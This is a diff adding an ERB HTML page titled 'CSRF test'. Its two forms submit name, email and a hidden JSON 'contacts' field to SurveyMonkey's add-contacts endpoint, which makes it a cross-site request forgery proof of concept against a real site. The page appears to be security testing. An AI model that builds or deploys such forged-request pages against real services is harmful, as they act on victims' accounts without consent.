@@ -1,0 +1,30 @@
+<h1>CSRF test</h1>
+
+<form id="add_contact_form" action="https://www.surveymonkey.com/addressbook/add-contacts/">
+  <ul>
+    <li>
+      <label for="first_name">first name</label>
+      <input id="first_name" type="text" name="first_name" value="<%= @first_name %>"/>
+      <label class="error" for="name" id="first_name_error">This field is required.</label>
+    </li>
+    <li>
+      <label for="last_name">last name</label>
+      <input id="last_name" type="text" name="last_name" value="<%= @last_name%>"/>
+      <label class="error" for="last_name" id="last_name_error">This field is required.</label>
+    </li>
+    <li>
+      <label for="email">email</label>
+      <input id="email" type="text" name="email" value="<%= @email %>.com" />
+      <label class="error" for="email" id="email_error">This field is required.</label>
+    </li>
+    <li>
+      <input id="submit" type="submit"/>
+    </li>
+  </ul>
+
+</form>
+
+<form id="add_contact_form2" action="https://www.surveymonkey.com/addressbook/add-contacts/" method="post">
+  <input type="hidden" name="contacts" value="<%= @contacts.to_json %>">
+  <input type="submit" value="submit form query"</input>
+</form>
